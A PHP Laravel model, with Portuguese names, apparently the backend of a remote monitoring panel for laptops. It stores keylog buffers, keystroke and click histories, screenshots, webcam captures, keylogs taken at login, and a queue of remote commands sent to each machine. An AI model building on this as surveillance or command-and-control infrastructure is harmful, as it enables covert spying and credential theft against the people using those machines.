<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;

class Notebook extends Model
{
    use HasFactory;

    protected $fillable = [
        'identificador',
        'usuario_atual',
        'status',
        'ip_address',
        'hostname',
        'ultimo_login',
        'ultimo_heartbeat',
        'screenshot',
        'webcam',
        'historico_login',
        'comandos_pendentes',
        'sistema_operacional',
        'info_sistema',
        'keylog_buffer',
        'historico_teclas',
        'historico_cliques',
        'atividades_recentes'
    ];

    protected $casts = [
        'historico_login' => 'array',
        'comandos_pendentes' => 'array',
        'info_sistema' => 'array',
        'historico_teclas' => 'array',
        'historico_cliques' => 'array',
        'atividades_recentes' => 'array',
        'ultimo_login' => 'datetime',
        'ultimo_heartbeat' => 'datetime',
    ];

    public function getEstaOnlineAttribute()
    {
        if (!$this->ultimo_heartbeat) {
            return false;
        }
        
        return $this->ultimo_heartbeat->diffInMinutes(now()) < 5;
    }

    public function adicionarLogin($usuario, $ip, $fonte, $keylog = null)
    {
        $historico = $this->historico_login ?? [];
        
        $novoLogin = [
            'login_em' => now()->toISOString(),
            'usuario' => $usuario,
            'ip' => $ip,
            'fonte' => $fonte,
            'keylog_inicial' => $keylog
        ];

        array_unshift($historico, $novoLogin);
        
        // Mantém apenas os últimos 50 logins
        $historico = array_slice($historico, 0, 50);
        
        $this->update(['historico_login' => $historico]);
    }

    public function adicionarComando($acao, $parametros = [])
    {
        $comandos = $this->comandos_pendentes ?? [];
        
        $comando_id = uniqid();
        
        $comandos[] = [
            'id' => $comando_id,
            'acao' => $acao,
            'parametros' => $parametros,
            'criado_em' => now()->toISOString(),
            'executado' => false,
            'executado_em' => null
        ];
        
        $this->update(['comandos_pendentes' => $comandos]);
        
        return $comando_id;
    }

    public function limparComandosExecutados()
    {
        $comandos = $this->comandos_pendentes ?? [];
        $comandos_ativos = [];
        
        foreach ($comandos as $comando) {
            // Mantém apenas comandos não executados ou executados há menos de 1 hora
            if (!isset($comando['executado']) || !$comando['executado']) {
                $comandos_ativos[] = $comando;
            } elseif (isset($comando['executado_em'])) {
                $executado_em = \Carbon\Carbon::parse($comando['executado_em']);
                if ($executado_em->diffInHours(now()) < 1) {
                    $comandos_ativos[] = $comando;
                }
            }
        }
        
        $this->update(['comandos_pendentes' => $comandos_ativos]);
    }

    public function adicionarAtividade($tipo, $dados)
    {
        $atividades = $this->atividades_recentes ?? [];
        
        $atividades[] = [
            'timestamp' => now()->toISOString(),
            'tipo' => $tipo,
            'dados' => $dados
        ];
        
        // Mantém apenas as 100 atividades mais recentes
        $atividades = array_slice($atividades, -100);
        
        $this->update(['atividades_recentes' => $atividades]);
    }
}